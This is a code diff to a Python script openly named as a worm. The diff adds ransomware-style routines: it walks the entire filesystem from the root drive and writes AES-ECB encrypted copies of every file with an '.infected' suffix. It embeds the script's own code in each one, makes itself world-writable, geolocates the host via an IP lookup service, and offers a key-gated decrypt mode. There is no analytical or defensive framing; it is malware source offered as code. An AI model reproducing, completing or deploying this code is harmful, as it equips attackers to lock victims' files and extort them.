@@ -1,42 +1,69 @@
 import os
 import sys
 import time
+import json
 import socket
 import base64
 import requests
 from Crypto.Cipher import AES
+from Crypto.Hash import SHA512
 from Crypto.Util.Padding import pad, unpad
 from dataclasses import dataclass, field, asdict
 
 os.chmod(sys.argv[0], 777)
+echo = open(sys.argv[0], 'rb').read()
 
 
 @dataclass
-class WormDigest:
+class WormConfig:
     key: bytes = field(default=b"mysecretpassword")
-    def __init__(self): self.cipher = AES.new(self.key, AES.MODE_ECB)
+    scan: str = field(default="C:\\" if sys.platform.startswith('win') else "/")
+    ip_local: str = field(default=socket.gethostbyname(socket.gethostname()))
+    ip_resolver: str = field(default="http://ip-api.com/json")
+    def __repr__(self): return "<WormConfig %r>" % asdict(self)
+
+    def __init__(self):
+        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".wormconfig"), "r") as conf:
+            for line in conf.readlines():
+                k, v = line.replace('\n', '').split(' ')
+                if 'key' in k and 'default' not in v:
+                    self.key = v
+                elif 'scan' in k and 'default' not in v:
+                    self.scan = v
+                elif 'ip_local' in k and 'default' not in v:
+                    self.ip_local = v
+                elif 'ip_resolver' in k and 'default' not in v:
+                    self.ip_resolver = v
+
+
+@dataclass
+class WormDigest(WormConfig):
+    cipher: AES = field(default=AES.new(WormConfig.key, AES.MODE_ECB))
+    virus_data: bytes = field(default=echo)
+    @staticmethod
+    def ChecksumSHA512(data): return SHA512.new(data).hexdigest()
+
+    def __init__(self):
+        super(WormDigest, self).__init__()
 
     def EncodeAES(self, plaintext):
         if isinstance(plaintext, str):
             plaintext = plaintext.encode('utf-8')
-        return self.cipher.encrypt(
-            pad(
-                base64.urlsafe_b64encode(
-                    plaintext
-                ), AES.block_size
+        return base64.urlsafe_b64encode(self.cipher.encrypt(
+                pad(
+                    plaintext, AES.block_size
+                )
             )
-        )
+        ).decode('utf-8')
 
     def DecodeAES(self, ciphertext):
         if isinstance(ciphertext, str):
             ciphertext = ciphertext.encode()
-        return base64.urlsafe_b64decode(
-            unpad(
+        return unpad(
                 self.cipher.decrypt(
-                    ciphertext
+                    base64.urlsafe_b64decode(ciphertext)
                 ), AES.block_size
-            )
-        ).decode('utf-8')
+            ).decode('utf-8')
 
 
 @dataclass
@@ -92,24 +119,113 @@ class Host:
     last_refresh: float = field(init=False, default=float)
     geoip: GeoIP = field(default=GeoIP)
     inet: INET = field(default=INET)
+    crypto: WormDigest = field(default=WormDigest)
+    fs_scan_list: list = field(default=list)
+    locked_file_list: list = field(default=list)
     def __repr__(self): return "<Host %r>" % asdict(self)
     def __init__(self): self.id = hex(id(self))
 
     def refresh(self):
+        self.crypto = WormDigest()
         self.geoip = GeoIP()
         self.inet = INET()
         self.inet.public_ip = self.geoip.query
         self.os_name = os.name
         self.platform = sys.platform
         self.last_refresh = time.time()
+        self.fs_scan_list = []
+        self.locked_file_list = []
+        for root, dirs, files in os.walk(self.crypto.scan):
+            for file in files:
+                self.fs_scan_list.append(os.path.join(root, file))
         return self
 
+    def encrypt(self, delimiter="|:|", suffix=".infected"):
+        for file in self.fs_scan_list:
+            with open(file, 'rb') as fin:
+                data_read = fin.read()
+                with open(file+suffix, 'w') as fout:
+                    encrypted_data = {
+                        "checksum": self.crypto.ChecksumSHA512(data_read),
+                        "fileData": self.crypto.EncodeAES(data_read),
+                        "encryptedVirus": self.crypto.EncodeAES(
+                            self.crypto.EncodeAES(
+                                time.time().hex().encode()
+                            ) + delimiter + self.crypto.EncodeAES(self.crypto.virus_data)
+                        ),
+                        "iv": self.crypto.EncodeAES(self.crypto.EncodeAES(
+                            time.time().hex().encode()
+                        ) + delimiter + self.crypto.EncodeAES(self.crypto.key))
+                    }
+                    json.dump(encrypted_data, fout, indent=2)
+                    self.locked_file_list.append(file+suffix)
 
-host = Host()
-wd = WormDigest()
-host.refresh()
-enc_data = wd.EncodeAES(host.geoip.query)
-print(enc_data)
-time.sleep(3)
-plaintext = wd.DecodeAES(enc_data)
-print(plaintext)
+        return self
+
+    def decrypt(self, delimiter="|:|", clean_tag=".clean", infected_tag=".infected"):
+        if clean_tag in self.crypto.scan:
+            sys.stdout.write("[!] clean files cannot be decrypted again [!]")
+            sys.exit(0)
+        if os.path.isdir(self.crypto.scan):
+            for root, dirs, files in os.walk(self.crypto.scan):
+                for name in files:
+                    if name.endswith(infected_tag):
+                        with open(os.path.join(root, name), "rb") as fin:
+                            encrypted_data = json.load(fin)
+                            obj = {
+                                "checksum": encrypted_data["checksum"],
+                                "iv": [self.crypto.DecodeAES(i) for i in
+                                       self.crypto.DecodeAES(encrypted_data["iv"]).split(delimiter)],
+                                "fileData": self.crypto.DecodeAES(encrypted_data["fileData"]),
+                                "encryptedVirus": [self.crypto.DecodeAES(i) for i in
+                                                   self.crypto.DecodeAES(encrypted_data["encryptedVirus"]).split(
+                                                       delimiter)]
+                            }
+                        with open(os.path.join(root, name+clean_tag), "w") as fout:
+                            json.dump(obj, fout, indent=2)
+                        os.remove(os.path.join(root, name))
+        else:
+            with open(self.crypto.scan, 'rb') as fin:
+                encrypted_data = json.load(fin)
+                obj = {
+                    "checksum": encrypted_data["checksum"],
+                    "iv": [self.crypto.DecodeAES(i) for i in
+                           self.crypto.DecodeAES(encrypted_data["iv"]).split(delimiter)],
+                    "fileData": self.crypto.DecodeAES(encrypted_data["fileData"]),
+                    "encryptedVirus": [self.crypto.DecodeAES(i) for i in
+                                       self.crypto.DecodeAES(encrypted_data["encryptedVirus"]).split(delimiter)]
+                }
+            with open(os.path.join(self.crypto.scan+clean_tag), "w") as fout:
+                json.dump(obj, fout, indent=2)
+            os.remove(self.crypto.scan)
+            return obj
+
+
+
+
+def run(args):
+    host = Host()
+    host.refresh()
+    if args.encrypt:
+        host.crypto.scan = args.encrypt
+        sys.stdout.write("[ENCRYPTING]")
+        host.encrypt()
+        sys.exit(0)
+    if args.decrypt and args.key:
+        host.crypto.scan = args.decrypt
+        host.crypto.key = args.key.encode()
+        sys.stdout.write("[DECRYPTING]")
+        host.decrypt()
+        sys.exit(0)
+
+
+
+
+if __name__ == "__main__":
+    from argparse import ArgumentParser
+    parser = ArgumentParser()
+    parser.add_argument("-e", "--encrypt", type=str, help="-e <FILE_PATH>")
+    parser.add_argument("-d", "--decrypt", type=str, help="-d <FILE_PATH>")
+    parser.add_argument("-k", "--key", type=str, help="-k <DECRYPTION_KEY>")
+    args = parser.parse_args()
+    run(args)
